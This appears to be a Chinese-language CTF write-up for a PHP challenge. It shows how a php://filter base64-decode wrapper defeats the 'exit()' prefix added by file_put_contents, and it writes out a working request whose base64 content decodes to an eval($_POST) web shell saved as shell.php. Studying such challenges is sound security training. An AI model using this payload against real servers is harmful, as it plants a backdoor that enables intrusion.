<p>polar  写shell</p>
<p><img src="/../picture/image-20250401193750422.png" alt="image-20250401193750422"></p>
<p>file_put_contents  函数  会把**&lt;?php exit();”.$_POST[‘content’]** 存入到 <strong>$_GET[‘filename’]</strong> 文件里</p>
<p>但是这里的&lt;?php exit();          执行时就会直接先执行exit()退出了  导致我们后面的代码无法执行</p>
<p>这里就需要绕过一下exit();   </p>
<p>这里是</p>
<p><strong>php死亡exit()绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>

<p><strong>tips：伪协议处理时会对过滤器urldecode一次；面对不可用的规则是报个Warning，然后跳过继续执行</strong></p>
<p>base64编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/read/convert.base64-decode/resource=shell.php</span><br><span class="line">content=aPD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>

<p>利用php:&#x2F;&#x2F;filter 伪协议  先将  &lt;?php exit();”.$content   也就是  &lt;?php exit();aPD9waHAgcGhwaW5mbygpOz8+  内容解码后再写入  shell.php  文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;`base64编码后为`PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>

<p>前面加个a的原因是base64解码以4个字节为1组转换为3个字节</p>
<p>前面的&lt;?php exit(); 符合base64编码的只有phpexit这七个字节，因此添加一个字节来满足编码</p>
<p>&lt;?php exit();a 就会被base64解密从而乱码，这样就不会被当成PHP代码执行了。</p>
<p>&lt;?  空格  ;  为什么不算呢？</p>
<p><strong>Base64 解码时，符号的处理方式</strong></p>
<p>在 PHP 中，<code>base64_decode()</code> 只处理 <strong>Base64 允许的字符</strong>，即：</p>
<ul>
<li><code>A-Z</code></li>
<li><code>a-z</code></li>
<li><code>0-9</code></li>
<li><code>+</code> 和 <code>/</code></li>
<li><code>=</code>（填充符）</li>
</ul>
<p><strong>任何不在这个范围内的符号</strong>（例如空格、<code>&lt;</code>, <code>?</code>, <code>;</code>）：</p>
<ul>
<li>如果出现在 Base64 数据中，可能会被忽略、导致解码失败，或者返回 <code>false</code>（如果 <code>strict</code> 参数为 <code>true</code>）。</li>
<li>但 <code>base64_decode()</code> <strong>不会把它们当作特殊字符处理</strong>，它只是单纯地按照 Base64 规则解析。</li>
</ul>
<p>所以base解码并不会识别&lt;?  空格  ;  也就是只有七个字节需要加一个字节来凑一下</p>
<p>ok   回到这道题</p>
<p>这里我们直接利用php:&#x2F;&#x2F;filter 伪协议  对其进行base64解码  来写入shell</p>
<p>?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.php</p>
<p>post:  content&#x3D;aPD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+</p>
<p><img src="/../picture/image-20250401200553997.png" alt="image-20250401200553997"></p>
<p><img src="/../picture/image-20250401200829019.png" alt="image-20250401200829019"></p>
<p>这里访问shell.php  发现也就执行成功了   �^�+Z就是前面&lt;?php exit();a  解码成的乱码</p>
<p>然后再利用写入的shell解题</p>
<p><img src="/../picture/image-20250401200941728.png" alt="image-20250401200941728"></p>
<p><img src="/../picture/image-20250401201000257.png" alt="image-20250401201000257"></p>
